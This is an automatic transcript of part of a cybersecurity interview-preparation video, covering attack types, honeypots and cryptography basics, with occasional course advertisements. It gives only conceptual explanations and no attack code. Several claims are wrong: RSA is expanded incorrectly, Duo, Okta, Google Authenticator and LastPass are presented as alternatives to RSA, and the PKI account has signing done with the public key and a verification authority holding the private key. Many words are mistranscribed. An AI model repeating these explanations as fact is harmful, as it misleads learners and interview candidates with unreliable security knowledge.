keys for encrypted file so once your
files have been encrypted you might just
have a blank screen in front of you
where you'll receive a warning message
uh where it instructs you to pay up a
ransom in bitcoins or in some
cryptocurrency to some particular
digital e-wallet which is not traceable
and once you make that payment they will
send you the decryption key and then you
can access your data if getting your
learning started is half the battle what
if you could do that for free visit up
by simply learn click on the link in the
description to know more
then talking about the next question
what is the difference between an active
and a passive cyber attack now when we
talk about cyber attacks cyber attack is
activity that is caused by a malicious
user who wants to try to
get access or do some security incidents
on the victim's devices so there are two
ways that can happen it's either in an
active manner or a passive manner in an
active manner the intruder attempts to
disrupt a network's normalcy modifies
data and tries to alter the system's
resources so this is more active where
the attacker will proactively
try to
destroy the network so that
communications fail or they might try to
modify the data where
we're using a ransom where they can
encrypt it or they might delete that
data using a virus or steal that data
using a trojan or they might even alter
the data
so that it is no longer trustworthy
whereas in a passive attack the intruder
intercepts data traveling to a network
here the intruder eavesdrop but does not
modify the message so they're just
listening in they're just observing what
is going on they are not manipulating
the data they are not stealing anything
it's just that they are monitoring the
activity that's going on the next
question what is a social engineering
attack now social engineering attack is
a people based attack the victim here is
the human by itself the vulnerability
also lies in the human it may be
executed through a computer but
end of the day the calibrity is of the
human so it is the art of manipulating
people so that they end up giving up
confidential information
now we always read in the papers where
somebody got manipulated their passwords
got hacked and somebody's life savings
got wiped out
right because they shared the otp with
someone or they shared a
the password with someone now creating a
scenario where these people will fall
prey to this attack and share this kind
of personal information
to unknown people that is where the
social engineering attack comes in
creating that scenario which will ensure
that these people give out this
confidential information now there are
three categories in this attack one the
first one is a phishing attack second is
a sphere phishing attack and a third is
a railing attack now phishing attack is
basically a generic attack
it is targeted to the world at large
whoever falls prey to that attack
will be a victim
whereas a spear phishing attack is a
targeted attack towards a specific
individual or a group of individuals or
towards an organization so there is a
lot more research that goes into
spearfishing where you analyze the
victim you try to figure out what their
vulnerabilities are and you tailor make
or you customize the attack
to that
particular vulnerability once you have
that attack you launch it against those
people those people
will then fall prey to this attack an
availing attack is where you're
attacking
uh top-level executives so the c-level
executives of an organization
politicians movie stars wealthy and
powerful people
so any of these people when they're
attacked it will be known as a whaling
attack
next question what is man in the middle
attack now this is something that we had
touched based when we talked about arp
where the arp poisoning attack needs to
be executed to leverage a man in the
middle attack now
in the man in the middle attack
the attacker attacking computer takes
the ip address of the client unaware of
this the server continues to communicate
with the attacker now if you remember in
a previous question we have also talked
about spoofing so in this scenario
attacker has spoofed their ip address to
replicate themselves as a genuine client
and now with that spoofing in mind they
might either through our poisoning
attack or just because of the spoofed ip
address become a man in the middle that
means that they are now
each dropping on the conversation
between the actual
client and the server by posing
themselves as a server in this scenario
the attacker is now
a go between between the client and the
server and can eavesdrop and can copy
the data if they want they can modify
the data as well so as you can see on
the screen the attacker becomes man in
the middle which means that they are now
eavesdropping on the conversation that
is happening between the client and the
server the next question
who are black hat hackers and whitehead
hackers the main thing is the
differentiation between a black hat
hacker and a white hat hacker now our
black hat hackers are skilled
individuals
who illegally hack into a system the
motive behind such an attack is mostly
for monetary gain these individuals are
known also known as security crackers
now if you look at your criminal hackers
those who have malicious intent those
who do hacking for the intent of
personal gain or for the
matter of disruption the main thing that
black hat hackers
lack
is authorization they are not authorized
to do the activity that they are about
to do and they are going to get
unauthorized access to devices or to
data which is going to cause losses to
the organization involved
whereas on the other side a white hat
hacker
are also known as ethical hackers
these are the individuals who discover
vulnerabilities in a computer network
and they help the organizations mitigate
these vulnerabilities they help the
organizations defend themselves from
black hat hackers so the main difference
between these two types of hackers a
black hat and a white hat is the intent
and the authorization so black hat
hackers will have malicious intent they
will try to personally gain from that
attack
from by finding out vulnerabilities they
also will not have authorization to
conduct whatever activity they are doing
whereas on the other side whitehead
hackers will be hired by organizations
they will provide authorization for
certain activity that the white hat
hacker can do to find out those
vulnerabilities once those possibilities
have been fined found out by the white
hat hacker they will report it to the
management and guide them in
implementing security controls to
mitigate those vulnerabilities the main
difference between a black hat and a
white hat is the authorization and the
intent the next question what are honey
pots
now honeypots are
a very interesting device that can be
introduced in a network
uh these basically are decoy servers
that are implemented in the network to
attract the attention of attacker
it is there to lure an attacker
into
uh attacking that particular device
thus creating a security blanket blanket
for the rest of the devices
so if an attacker has been able to
bypass a firewall and is now trying to
scan a particular network when they scan
they will come across various devices
that are there in the network they will
then proceed to do a vulnerability scan
on these devices the honeypot at that
point in time will provide as an approve
as an attraction to these attackers
because it will
demonstrate some vulnerabilities to the
hacker which will divert their attention
so these vulnerabilities are simulated
on these devices these actually do not
exist but the moment the attacker then
starts interacting with the honeypot the
honeypot will identify that as a
malicious traffic and will warm the one
the administrator about a possible
attack that is going on the
administrator will then investigate
through the honeypot of what activity is
going on and then reconfigure the
security controls to block the attacker
or mitigate the attack itself right so
it is more of a decoy server
uh that will showcase or simulate some
vulnerabilities to an attacker thus to
lure them
and safeguard the rest of the network
these are the 10 questions for
cybersecurity in the next video we'll be
talking about cryptography the first
question define cryptography encryption
and decryption
now cryptography
is used by security professionals to
scramble data
into non-readable format
which is used in securing that
information
so it involves converting data from a
readable format into a non-readable
format and then reversing it back to
readable format again
for example the word computer is now
scrambled into looking like a unreadable
format now if you look at this word that
it has been scrambled into it would be
very difficult
for a human to figure out
what the actual world was
now in this scenario we have taken an
algorithm where we have made a
shift of the alphabet where we have
added two alphabets the current one so c
plus two becomes e
o plus two becomes q m plus two becomes
o so we have done a shift of two and
thus the key over here for this
algorithm
is the alphabet plus two so any person
who figures that out will be able to
unscramble this and convert this back
into readable text
the fact of scrambling a readable text
data into something that is unreadable
by using a particular key is what
cryptography is all about
now as we discussed the decryption again
is
replacing the alphabet and taking it
further back by two characters so e
minus two becomes c q minus two becomes
o o minus two becomes m and so on so
forth so anybody who knows this key uh
the shift key
anybody will able to
decrypt this particular character so
this depends on the user if i want to
utilize alphabet plus five then the
spacing the shifting of that character
will be the fifth character from that
particular character
and so on so forth
the next question what is the difference
between cipher text and clear text
cipher text refers to the text which is
encrypted and totally undecided
the message received after decryption is
known as clear text this text is
comprehensible so the word computer is
clear text that means that it has not
been treated to any cryptographic
measures it does what it is intended to
be
however if the moment we encrypt it that
means we scramble it into unreadable
text by using any of the algorithms that
we'll be looking at
that text is known as a cipher text
and without the key this becomes
unreadable
the clear text as discussed is the plain
word that we have utilized we are using
the english language in this instance so
the plain word computer is the clear
text once we add the encryption layer to
it
we get the cipher text to it
moving on to the next question what is a
block cipher
this refers to the method of encrypting
the plain message block by block the
plain message is broken down into fixed
size blocks and then encrypted now a
block cipher is normally used for data
that is stored so a data that is stored
on a hard disk and we want to encrypt
that data that is known as block
encryption or a block cipher so a block
cipher is an algorithm
that will allow you to encrypt data that
is stored onto a hard disk so in this
example we've got
a plain text which is 64 bits in size
and we have
added a layer of encryption to it so
plain text plus the key that we have
studied in the previous questions and
then the scrambled data out of it which
is unreadable and thus encrypted then
the next question what is public key
infrastructure now the public key
infrastructure is a set of policies
which secures the communication between
a server and a client it uses two
cryptographic keys public and private so
the infrastructure itself is a set of
policies people procedures and
techniques
which are standardized in nature
and are globally accepted
which allow us to use digital
certificates to encrypt data and decrypt
the data
at the other end we use asymmetric
encryption over here which means that we
are used to keys one is a public key to
encrypt and the private key to decrypt
the other part of your encryption is a
symmetric encryption where the same key
is used to encrypt and the same key is
used to decrypt
now in a public key infrastructure
like i said we have standardized that so
insta in the standardizing part of it
these are the various players that have
been defined in the public key
infrastructure the first is this
user or the sender in the scenario the
one who requires this digital signature
to digitally sign a particular
transaction or a communication a
registration authority with whom they
are going to register for that
particular key the certification
authority who issues that key
the verification of the authority who
validates the
key itself and the recipient who is
going to be the other party of that
particular transaction so how is this
utilized
a sender or the user who requires this
digital signature will request or apply
for a digital signature with the
registration authority the registration
authority would validate the
genuinely of the user so they might do
some
identity verification or
proof of residence or something like
that once they've identified the person
and they have validated the information
they will then send the request to the
certification authority stating that the
sender has been validated and we can and
the certification authority can issue
the digital certificate to the
particular user
they will send the public key to the
sender which will be utilized by the
sender for further transactions so when
the sender
is going to sign some data and
wants to send it across to the and they
will use the public key to sign it and
send it across
the recipient will then validate with
the verification authority to see if the
data the signed data is correct or not
now
while
the certification authority sends the
public key to the sender the
certification authority updates the
private key with the verification
authority so whatever is signed by the
sender
uh received by the recipient and they
want to validate it they will send it
back to the verification authority
the verification authority will validate
using the private key once the private
key is validated
it will then send the okay signal back
to the recipient thus allowing the
validation of that particular
transaction
if the signature is tampered with or is
not the very fiction authority is not
able to validate the signature it will
then send a denial message back to the
recipient and the transaction will
not go through so the pka enables
trusted digital identities for people so
the pki grants secure access to digital
resources based on the infrastructure
that has been created and the core of
the pki is a certification authority
which ensures that the trustworthiness
of the digital data is ensured
so
going back to the previous slide
these are the key players that have been
standardized in the public key
infrastructure the certification
authority is the authority that issues
the digital certificates the validation
authority is the one who validates that
digital certificate
moving on what is rsa
rsa is one of the first public key
crypto systems that is used for secure
data transmission it stands for reverse
xiaomira and edelman now these are the
three people who have created this
algorithm rand rivest adi shamir and
leonard edelman who are the inventors of
this technique it is a asymmetric
cryptography algorithm which works on
both public and private keys hence the
encryption key is public and the
decryption key is kept private now as we
have discussed earlier symmetric and
asymmetric cryptography symmetric
cryptography is where the same key is
used to encrypt and decrypt whereas
asymmetric cryptography is where there
are two keys to encrypt and decrypt the
algorithm what are the few alternatives
to rsa now rsa is an algorithm that is
used for encryption there are a lot of
other algorithms that can be utilized uh
to alter or to scramble data depending
on your requirements so in the previous
question we have studied and we have
talked about what
rsa is it stands for
reverse xiaomi and edelman the three
creators of that particular algorithm
but there are a lot of alternatives to
this algorithm depending on how secure
you want that data to be
and some of them are
listed here on your screen duo security
octa google authenticator and lastpass
lastpass is a password manager
so is dual security google authenticate
is something that we all utilize it is
an application that we can download and
store on our mobile devices and we can
set that up to
authenticate ourselves with certain
portals so it issues a unique id to us
which once utilized will allow us access
to those particular portals octa is an
identity manager where you have created
different digital identities and you
have assigned them certain permissions
and based on your authentication
mechanisms octa will allow or disallow
access to those different applications
or different portals as you have
configured it so all four
are
authorization authentication mechanisms
which can be used as alternatives to rsa
if getting your learning started is half
the battle what if you could do that for
free visit scale up by simply learn
click on the link in the description to
know more
next question what are the prime
objectives of modern cryptography and
this is a very important question
because we've so far looked at what
cryptography is and what public key
infrastructure is but what is the
achievement out of it why are we
utilizing it and what do we want to
gain out of it so the main and the prime
objectives of modern cryptography are
as follows mentioned on your screen the
first one is confidentiality
the second one is non-repudiation
third one is authenticity and the fourth
one is integrity
now if i go back to the first one
confidentiality uh that is where i want
to keep data confidential that means it
will only be visible to the authorized
users right so here i've
created a list of people who have deemed
as authorized users and have created a
digital identity to them and have given
access controls to those people now that
is how confidentiality is
ensured so
when we want to keep data confidential
we create a list of users who we are
going to allow access to certain
resources and we are going to define
what access controls are to be utilized
what access are allowed whether they got
an administrative access or user level
access and only those authorized users
are going to be
able to access this resources that is
how we maintain confidentiality
the next one is non-repudiation
non-reputation is the prevention of
denial of having been a part of a
particular transaction
so in the public key infrastructure that
we discussed where a digital signature
was utilized to sign a particular
transaction
and then sent to the recipient the
sender would not be able to deny of
having originated that transaction
because it was using their
digital certificate thus non-reputation
comes into the picture uh one more
example that we can have here is uh on
our mobile phones when we use sms short
messaging service and we send a message
to
uh to another person the person when
they receive a message the number is
validated by the service operator
and thus the sender cannot
deny having sent that message the sender
at the same time can have a delivery
report sent to them
that the message was delivered to the
inbox of the recipient and thus if the
recipient denies having received that
message the delivery report becomes
proof
of having
that message being delivered to their
inbox thus both the parties cannot deny
of have a of being a part of that
particular transaction
then comes the part of authenticity
now in confidentiality we have created a
digital identity assigned to a
particular person
and we have given them digital
signatures where they cannot deny having
being a part of that transaction but
authenticity is the part where they try
to prove that they are who they claim to
be so if i am claiming a digital
identity
i have to prove that i am that person
who who i i'm trying to claim to be and
an example to that is when we go to our
gmail.com websites it first asks us what
is our username our username is normally
our email address which identifies the
account that we are trying to access
right so this account is confidential
because it is only authorized for a
particular person
and once
they identify themselves by identifying
the email address that's when the
authentication part comes into the
picture where it asks for the password
now it has never ever happened that we
just go on to the gmail.com type in a
password and then it figures out which
account we are talking about so the
first step is always called the
confidentiality part where we identify
which account we are talking about and
then we try to authenticate as the owner
of that particular account by providing
the
appropriate password to that account if
both of these match only then do we get
access to that account and
we are able to make whatever
transactions we want to make now when we
are making those transactions
non-reputation comes into the place
where all our activity is also being
logged so we have identified our account
we have authenticated ourselves by
providing the password so the proof is
there that it is us who are trying to
access it and then whatever activity we
do send an email receive an email delete
something attach something all of those
activities are logged
and stored as proof of what actions have
been done so tomorrow if we deny having
sent that email gmail can still prove to
us
through those logs that though that that
activity was done by us
and the fourth part is integrity which
ensures that the data received and sent
and
sent by the sender and received by the
recipient has not been modified while in
uh
motion
so the integrity part is the
trustworthiness of that data that the
data has not been modified by any hacker
or any other
entity and is still trustworthy
so these are the four prime objectives
of modern cryptography once i have
scrambled that data
using
my public's uh signature it is only my
private signature that is going to
decrypt it right
using these mechanisms i will be able to
achieve all these four aspects
of cryptography and
security next question what is safer
now safer stands for secure and fast
encryption routine which is also a block
cipher as we have discussed previously
block cipher is a cipher that is used to
encrypt data that is stored
so it has a 64-bit block size and
byte-oriented algorithm
ciphers encryption and decryption
procedures are highly secure this
technology is widely used in
applications like digital payment card
so when you are using your
a digital
payment gateway to make transactions so
you have you have gone on to an online
portal you want to purchase a particular
item
and then it takes you to another
payment gateway where you have to fill
in your credit card information
sensitive information like your
expiry dates cvv information and then
the otp or the password that you have
created for your particular account now
all of these need to be secured or
highly secured based on pci dss which is
the payment card industry data security
standard so these standards
ensure that certain protocols are
utilized
to attain that level of security safer
is one of those block ciphers that is
used under the digital payment gateway
infrastructure next question how does
the public infrastructure public key
infrastructure work now we have already
discussed this in the previous diagrams
we have identified the key players the
certification authority the registration
authority the end user who requires the
digital certificate the validation
authority who's going to validate it and
then the
recipe and the end user with whom the
transaction is going to be uh conducted
so the first point here is
the request for the digital certificate
is sent to the registration authority
they validate it and then they okay to
the certification authority who then
process the request and the digital
certificate is issued to the person who
has requested it
so when the person wants to conduct that
transaction they use that
digital certificate to sign that
transaction with the end user the end
user validates that with the validation
authority and once validated the
transaction goes through and now the
last question what is the blowfish
algorithm it is a 64-bit symmetric
encryption algorithm so this is an
algorithm that uses the same key
to encrypt and the same key to decrypt
the same secret key is used to encrypt
and decrypt the messages here the
operations are based on exclusive ors
and additions to on 32-bit words
the key has a maximum length of 448 bits
now this is a little bit technical uh
you might not want to go this technical
in a in an interview question you just
need to identify what the algorithm is
used for so whether it is a symmetric
algorithm which means it uses the same
key or
a symmetric algorithm where it uses a
public key to encrypt and a private key
to decrypt
this the blowfish algorithm is just one
more algorithm which uses symmetric
encryption to encrypt and decrypt data
algorithms that we have seen rsa and
others that we have discussed as far as
the interview questions are concerned
what we need to remember is
which algorithms are symmetric which
algorithms are asymmetric what do
symmetric algorithms do and what do
unsymmetric uh symmetric algorithms do
and we also look at block ciphers and
stream ciphers block ciphers are
utilized to encrypt data that is stored
stationary data data rest and stream
ciphers are utilized for data in motion
while having stream
and with that we have come to the end of
this video on cyber security full course
i hope it was informative and
interesting if you have any questions
related to the topics that were covered
in this video please ask away in the
comments section below our team will
help you solve your queries thanks for
watching stay safe and keep learning
you